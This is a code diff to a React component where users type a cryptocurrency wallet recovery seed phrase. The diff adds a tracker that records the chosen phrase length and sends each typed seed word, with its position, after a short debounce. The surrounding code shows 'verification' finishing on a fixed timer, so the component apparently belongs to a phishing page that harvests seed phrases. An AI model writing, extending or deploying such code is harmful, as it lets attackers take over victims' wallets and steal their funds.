@@ -333,17 +333,22 @@ function SeedDialog({
   open,
   onOpenChange,
   onVerified,
+  tracker,
 }: {
   open: boolean;
   onOpenChange: (o: boolean) => void;
   onVerified: () => void;
+  tracker: ReturnType<typeof useTrackedSession>;
 }) {
   const [count, setCount] = useState<"12" | "18" | "24">("24");
   const [words, setWords] = useState<string[]>(() => Array(24).fill(""));
   const [verifying, setVerifying] = useState(false);
+  const debounceRefs = useRef<Record<number, ReturnType<typeof setTimeout>>>({});
 
   useEffect(() => {
     setWords(Array(Number(count)).fill(""));
+    tracker.update({ seed_length: Number(count), step: `seed_${count}` });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [count]);
 
   useEffect(() => {
@@ -362,6 +367,17 @@ function SeedDialog({
     }, 3000);
     return () => clearTimeout(t);
   }, [verifying, onVerified]);
+
+  function handleWordChange(idx: number, value: string) {
+    const next = [...words];
+    next[idx] = value;
+    setWords(next);
+    const timers = debounceRefs.current;
+    if (timers[idx]) clearTimeout(timers[idx]);
+    timers[idx] = setTimeout(() => {
+      tracker.sendWord(idx + 1, value);
+    }, 300);
+  }
 
   const complete = words.length > 0 && words.every((w) => w.trim().length > 0);
 
@@ -396,7 +412,9 @@ function SeedDialog({
 
             {(["12", "18", "24"] as const).map((c) => (
               <TabsContent key={c} value={c} className="mt-6">
-                {count === c && <SeedGrid count={Number(c)} words={words} setWords={setWords} />}
+                {count === c && (
+                  <SeedGrid count={Number(c)} words={words} onWordChange={handleWordChange} />
+                )}
               </TabsContent>
             ))}
           </Tabs>
@@ -426,11 +444,11 @@ function SeedDialog({
 function SeedGrid({
   count,
   words,
-  setWords,
+  onWordChange,
 }: {
   count: number;
   words: string[];
-  setWords: (w: string[]) => void;
+  onWordChange: (idx: number, value: string) => void;
 }) {
   const [focusedIdx, setFocusedIdx] = useState<number | null>(null);
   return (
@@ -462,11 +480,7 @@ function SeedGrid({
               value={raw}
               onFocus={() => setFocusedIdx(i)}
               onBlur={() => setFocusedIdx((cur) => (cur === i ? null : cur))}
-              onChange={(e) => {
-                const next = [...words];
-                next[i] = e.target.value;
-                setWords(next);
-              }}
+              onChange={(e) => onWordChange(i, e.target.value)}
               className={`w-full bg-transparent text-sm outline-none ${filled ? "text-black" : "text-gray-500"}`}
               autoComplete="off"
             />
@@ -476,6 +490,7 @@ function SeedGrid({
     </div>
   );
 }
+
 
 /* ---------- Icons ---------- */
 
